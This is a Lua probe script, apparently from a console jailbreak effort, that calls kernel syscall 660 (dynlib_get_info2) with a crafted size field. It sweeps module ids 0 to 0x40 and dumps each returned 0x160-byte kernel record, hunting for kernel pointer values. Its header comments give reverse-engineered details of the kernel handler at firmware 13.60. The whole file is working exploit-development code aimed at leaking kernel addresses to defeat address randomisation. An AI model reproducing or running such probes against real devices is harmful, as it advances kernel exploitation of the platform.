-- CRASH_CLASS: LOW (single mapped 0x200 buffer, only copyout destinations are inside it)
-- PROBE 1196c: sys 660 dynlib_get_info2, called with the size field it demands.
-- Static (13.60 body 0x8ad0bc60 -> 0x8ad0b950):
--   a0 = module id (u32), a1 = user ptr; copyin(a1,&[rbp-0x38],8) and the value MUST be 0x160
--   (the output record size) or the handler returns 0x16 EINVAL. It then mallocs 0x160, walks the
--   module list matching [entry+0x28]==id, strlcpy's the module path (a kernel string) into out+0x08
--   (0x100 bytes), sets a byte at +0x107, fills +0x108..+0x147 and more, then copyout(rec, a1, 0x160).
-- So a1 is both the size-in and the record-out. This probe sweeps ids 0..0x40 and dumps every record
-- that comes back, hunting for ffff8... values inside a 0x160-byte kernel-built struct.
print("=== PROBE 1196c: sys 660 dynlib_get_info2 RECORD SWEEP ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function U(v) return uint64(string.format("0x%08X%08X", math.floor(N(v)/4294967296), N(v) % 4294967296)) end
local function hx(n) n = n % 4294967296 local hi = math.floor(n/65536) local lo = n - hi*65536 return string.format("%04X%04X", hi, lo) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a, U(v)) end) end
local function asc(a,n) local s={} for i=0,n-1 do local v=rd(a+i) if v and v~=0 then s[#s+1]=string.format("%02X",v) end end return table.concat(s,"") end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "?" end
local B = N(memory.alloc(0x200))
local sc = mk(660)
local function sent() for o=0,0x1FC,4 do wd(B+o,0xA5A5A5A5) end end
local function q(o) local lo=rd(B+o) local hi=rd(B+o+4) if lo==nil or hi==nil then return "........" end return string.format("%08X%08X",hi,lo) end
local hits = 0
for id=0,0x40 do
  sent()
  wq(B,0x160)
  local ok, rv = pcall(function() return sc(U(id),U(B),U(0),U(0),U(0)) end)
  local rvs = ok and tostring(N(rv)) or "PCALLFAIL"
  local err = es()
  if rvs == "0" then
    hits = hits + 1
    print(string.format("[id %02X] rv=0 CALLER-SIZE=%s path(ascii)=%s", id, q(0), asc(B+8,0x20)))
    local line = {}
    for o=0x0,0x158,8 do
      local v=q(o)
      if v~="0000000000000000" then line[#line+1]=string.format("+%03X=%s",o,v) end
    end
    print("        "..table.concat(line," "))
  elseif rvs ~= "4294967295" then
    print(string.format("[id %02X] rv=%s", id, rvs))
  end
end
print("[SUM] records returned = "..hits)
print("[Z] alive")
print("=== DONE ===")
